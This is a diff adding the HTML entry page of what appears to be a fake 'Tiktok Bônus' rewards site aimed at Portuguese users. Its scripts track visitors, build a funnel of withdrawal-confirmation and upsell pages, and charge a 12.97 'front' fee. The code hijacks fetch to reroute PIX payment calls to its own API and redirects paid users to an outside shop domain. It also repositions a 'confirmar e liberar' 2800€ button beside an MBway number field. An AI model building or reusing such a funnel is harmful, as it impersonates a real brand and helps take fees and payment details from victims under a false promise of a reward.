@@ -1,0 +1,176 @@
+<!DOCTYPE html><html lang="en"><head>
+  <script type="text/javascript" async="" src="js/events.js"></script><script async="" src="https://www.clarity.ms/tag/vrrpr83vuj"></script><script src="js/utm-handler.js" data-token="NSfa8GzkRZPz9MQrM2SiX6khzXeb2XPCAwsv">
+    </script>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "vrrpr83vuj");
+  </script>
+  <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) { for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e }, ttq.load = function (e, n) { var i = "https://analytics.tiktok.com/i18n/pixel/events.js"; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = i, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; var o = document.createElement("script"); o.type = "text/javascript", o.async = !0, o.src = i + "?sdkid=" + e + "&lib=" + t; var a = document.getElementsByTagName("script")[0]; a.parentNode.insertBefore(o, a) };
+      ttq.load('D701J2RC77UANC7P0LQ0');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+  <script>
+    (function () {
+      var p = window.location.pathname.replace(/\/index\.html$/i, "").replace(/\/+$/, "") || "/";
+      var parts = p.split("/").filter(Boolean);
+      var appRoutes = { resgatar: 1, "confirmar-saque": 1, "back-redirect": 1, faq: 1, historico: 1, "upsell-1": 1, "upsell-2": 1, "upsell-3": 1, "upsell-4": 1, "upsell-5": 1 };
+      window.__TTK_BASE = !parts.length || (parts.length === 1 && appRoutes[parts[0]]) ? "" : "/" + parts[0];
+      window.__TTK_ASSETS_BASE = __TTK_BASE + "/assets";
+      var h = window.location.hostname, port = window.location.port || "80", o = window.location.origin || ("http://127.0.0.1:" + port);
+      var pathNow = window.location.pathname.replace(/\/+$/, "") || "/";
+      if (__TTK_BASE && h !== "127.0.0.1" && h !== "localhost" && pathNow !== __TTK_BASE && pathNow !== __TTK_BASE + "/") { window.location.replace(o + __TTK_BASE + "/" + (window.location.search || "") + (window.location.hash || "")); return; }
+      document.write('<base href="' + o + __TTK_BASE + "/" + '">');
+      document.write('<link rel="stylesheet" crossorigin href="' + __TTK_BASE + '/assets/index-Bzh8CIQh.css">');
+    })();
+  </script><link rel="stylesheet" crossorigin="" href="css/index-Bzh8CIQh.css">
+  <script src="js/central.js"></script>
+  <script>
+    (function () {
+      var key = 'ttk_preserved_query';
+      function mergeQuery(cur, stored) {
+        var p = new URLSearchParams(stored || '');
+        if (cur && cur.charAt(0) === '?') cur = cur.slice(1);
+        if (cur) { var q = new URLSearchParams(cur); q.forEach(function (v, k) { p.set(k, v); }); }
+        return p.toString();
+      }
+      function syncPreservedFromUrl() { var cur = window.location.search || ''; try { var st = sessionStorage.getItem(key) || ''; st = mergeQuery(cur, st); sessionStorage.setItem(key, st); window.__TTK_PRESERVED_QUERY = st; } catch (e) { } }
+      var cur = window.location.search || '';
+      try { var st = sessionStorage.getItem(key) || ''; st = mergeQuery(cur, st); sessionStorage.setItem(key, st); window.__TTK_PRESERVED_QUERY = st; } catch (e) { window.__TTK_PRESERVED_QUERY = cur; }
+      if (!window.location.search && window.__TTK_PRESERVED_QUERY) { var path = window.location.pathname + window.location.hash; window.history.replaceState(null, '', path + (window.__TTK_PRESERVED_QUERY ? '?' + window.__TTK_PRESERVED_QUERY : '')); }
+      setTimeout(syncPreservedFromUrl, 500); setTimeout(syncPreservedFromUrl, 1500); setTimeout(syncPreservedFromUrl, 3500); setTimeout(syncPreservedFromUrl, 6000);
+      function addPreservedToUrl(url) {
+        if (!url || typeof url !== 'string') return url;
+        var q = window.__TTK_PRESERVED_QUERY;
+        if (!q) return url;
+        var hash = '', idx = url.indexOf('#');
+        if (idx !== -1) { hash = url.slice(idx); url = url.slice(0, idx); }
+        var qidx = url.indexOf('?');
+        if (qidx === -1) return url + '?' + q + hash;
+        var base = url.slice(0, qidx), existing = new URLSearchParams(url.slice(qidx + 1)), preserved = new URLSearchParams(q);
+        preserved.forEach(function (v, k) { existing.set(k, v); });
+        return base + '?' + existing.toString() + hash;
+      }
+      var origPush = history.pushState, origReplace = history.replaceState;
+      history.pushState = function (s, t, u) { return origPush.call(history, s, t, addPreservedToUrl(u)); };
+      history.replaceState = function (s, t, u) { return origReplace.call(history, s, t, addPreservedToUrl(u)); };
+      window.__FUNIL_REDIRECT_LINK = "/checkout.html";
+      window.__FUNIL_REDIRECT_BACK = "/checkout.html";
+      window.__FUNIL_FEE_FRONT = (window.getCentralPrice && window.getCentralPrice('front', 12.97)) || 12.97;
+      window.__TTK_PAID_REDIRECT_URL = "https://novoeventotkk.shop/caminho/up/up1/";
+      var origFetch = window.fetch;
+      window.fetch = function (url, opts) {
+        var nextUrl = url;
+        var nextOpts = opts || {};
+        var originalUrl = typeof url === 'string' ? url : '';
+        var method = (nextOpts.method || 'GET').toUpperCase();
+
+        if (method === 'POST' && originalUrl.indexOf('create-pix') !== -1) {
+          try {
+            var body = nextOpts.body; if (typeof body === 'string') { var o = JSON.parse(body); o.utm_source = o.utm_source || (window.__TTK_UTM_SOURCE || (new URLSearchParams(window.__TTK_PRESERVED_QUERY || '').get('utm_source')) || ''); o.preserved_query = o.preserved_query || window.__TTK_PRESERVED_QUERY || ''; nextOpts.body = JSON.stringify(o); }
+          } catch (e) { }
+          nextUrl = '/api/checkout';
+        }
+
+        if (method === 'POST' && originalUrl.indexOf('check-pix') !== -1) {
+          var parsedBody = {};
+          try { parsedBody = JSON.parse(nextOpts.body || '{}') || {}; } catch (e) { }
+          var tx = parsedBody.transaction_id || parsedBody.id || '';
+          nextUrl = '/api/create-transaction?action=status';
+          nextOpts = Object.assign({}, nextOpts, { body: JSON.stringify({ id: tx }) });
+        }
+
+        return origFetch.call(this, nextUrl, nextOpts).then(function (res) {
+          if (typeof originalUrl === 'string' && originalUrl.indexOf('check-pix') !== -1 && res.ok) {
+            res.clone().json().then(function (data) {
+              if (data && (data.status === 'paid' || data.status === 'approved' || data.status === 'confirmed')) {
+                var base = window.__TTK_PAID_REDIRECT_URL || "https://novoeventotkk.shop/caminho/up/up1/";
+                var q = window.__TTK_PRESERVED_QUERY || "";
+                window.location.href = base + (q ? "?" + q : "");
+              }
+            }).catch(function () { });
+          }
+          return res;
+        });
+      };
+    })();
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <title>Tiktok Portugal</title>
+  <meta name="description" content="Tiktok Bônus - Programa de Recompensas">
+  <meta name="author" content="TTPay">
+
+
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="og:title" content="Tiktok Bônus">
+  <meta name="twitter:title" content="Tiktok Bônus">
+  <meta property="og:description" content="Tiktok Bônus - Programa de Recompensas">
+  <meta name="twitter:description" content="Tiktok Bônus - Programa de Recompensas">
+  <meta property="og:image" content="images/id-preview-e52009aa--a5bf967d-f327-4aa1-b701-0167684e10d9.lovable.app-1771998326390.png">
+  <meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/b531e0ac-e438-41c0-ac5a-d209ca192a30/id-preview-e52009aa--a5bf967d-f327-4aa1-b701-0167684e10d9.lovable.app-1771998326390.png">
+  <script>(function () { var b = window.__TTK_BASE || ""; var s = document.createElement("script"); s.type = "module"; s.crossOrigin = "anonymous"; s.src = b + "/assets/index-jPJOmtKw.js"; document.head.appendChild(s); })();</script><script type="module" crossorigin="anonymous" src="js/index-jPJOmtKw.js"></script>
+</head>
+
+<body>
+  <script>
+    (function () {
+      var p = window.location.pathname;
+      if (p.endsWith('index.html')) {
+        var base = p.replace(/index\.html$/i, '') || '/';
+        window.history.replaceState(null, '', base + window.location.search + window.location.hash);
+      }
+    })();
+  </script>
+  <div id="root"></div>
+  <script>
+    (function () {
+      function n(s) { return (s || '').toLowerCase().replace(/\s+/g, ' ').trim(); }
+      function onConfirmar() { return (window.location.pathname || '').indexOf('/confirmar-saque') !== -1; }
+      function findTopCtaBlock() {
+        var blocks = document.querySelectorAll('div.mx-4.mt-4.transition-all.duration-500.ease-out');
+        for (var i = 0; i < blocks.length; i++) {
+          var el = blocks[i];
+          var btn = el.querySelector('button');
+          if (!btn) continue;
+          var txt = n(btn.textContent);
+          if (txt.indexOf('confirmar e liberar') === -1) continue;
+          if (txt.indexOf('2800') === -1 && txt.indexOf('€') === -1) continue;
+          return el;
+        }
+        return null;
+      }
+      function findFormBlock() {
+        var input =
+          document.querySelector('input[placeholder*="Introduza o seu número MBway"]') ||
+          document.querySelector('input[placeholder*="Introduza o seu numero MBway"]') ||
+          document.querySelector('input[placeholder*="número MBway"]') ||
+          document.querySelector('input[placeholder*="numero MBway"]');
+        if (!input) return null;
+        return input.closest('div.mx-4') || input.parentElement;
+      }
+      function run() {
+        if (!onConfirmar()) return;
+        var ctaBlock = findTopCtaBlock();
+        var formBlock = findFormBlock();
+        if (!ctaBlock || !formBlock || !formBlock.parentElement) return;
+        if (ctaBlock.getBoundingClientRect().top < formBlock.getBoundingClientRect().top) {
+          formBlock.parentElement.insertBefore(ctaBlock, formBlock.nextSibling);
+        }
+      }
+      var tries = 0;
+      var timer = setInterval(function () { tries += 1; run(); if (tries > 120) clearInterval(timer); }, 180);
+      new MutationObserver(run).observe(document.documentElement, { childList: true, subtree: true });
+    })();
+  </script>
+
+
+</body></html>
